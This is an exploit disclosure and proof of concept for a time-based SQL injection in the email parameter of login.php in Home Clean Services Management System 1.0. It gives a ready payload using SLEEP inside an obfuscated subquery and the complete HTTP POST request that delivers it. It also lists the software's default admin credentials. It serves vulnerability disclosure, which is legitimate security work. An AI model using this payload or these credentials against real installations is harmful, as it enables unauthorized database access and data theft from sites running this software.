# Home Clean Services Management System login.php email SQL injection

   
#### Exploit Title: Home Clean Services Management System login.php email SQL injection
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://www.sourcecodester.com/php/15293/home-clean-service-free-source-code.html
#### Software Link: https://www.sourcecodester.com/download-code?nid=15293&title=Home+Clean+Service+System+in+PHP+Free+Source+Code
#### Version: Home Clean Services Management System 1.0
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Home Clean Services Management System does not filter the content correctly at the "login.php" email module, resulting in the generation of SQL injection.

#### Payload used:
`admin%'/**/AND/**/(SELECT/**/5383/**/FROM/**/(SELECT(SLEEP(2)))JPeh)/**/AND/**/'frfq%'='frfq`

#### Proof of Concept

1. Login the CMS. 
Admin Default Access:
Email: admin
Password: admin

1. Open Page http://172.24.5.102/HCS/public_html/

2. Put sleep(2) payload  (`asdasd@mail.com'/**/AND/**/(SELECT/**/5383/**/FROM/**/(SELECT(SLEEP(2)))JPeh)/**/AND/**/'frfq%'='frfq`) in the email content and click on Login to publish the page,Viewing the successfully sleep 2 seconds.
![image](https://user-images.githubusercontent.com/60683449/169930053-7c6f9ef0-70b5-4574-9eb3-347aa9a990c4.png)
![image](https://user-images.githubusercontent.com/60683449/169930098-674259a5-c5c1-4a3c-bf3d-79f63156a634.png)



3. code
```POST /HCS/public_html/login.php HTTP/1.1
Host: 172.24.5.102
Pragma: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
X-Proxyman-Repeated-ID: 235A6C1C
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3A9hTgZJbOpWAKqH
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Origin: http://172.24.5.102
Referer: http://172.24.5.102/HCS/public_html/index.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Upgrade-Insecure-Requests: 1
Content-Length: 431
Connection: close
Cookie: PHPSESSID=fjbdak9heg1r2divhtlpubv986

------WebKitFormBoundary3A9hTgZJbOpWAKqH
Content-Disposition: form-data; name="email"

asdasd@mail.com'/**/AND/**/(SELECT/**/5383/**/FROM/**/(SELECT(SLEEP(2)))JPeh)/**/AND/**/'frfq%'='frfq
------WebKitFormBoundary3A9hTgZJbOpWAKqH
Content-Disposition: form-data; name="password"

1231312
------WebKitFormBoundary3A9hTgZJbOpWAKqH
Content-Disposition: form-data; name="login"


------WebKitFormBoundary3A9hTgZJbOpWAKqH--
```
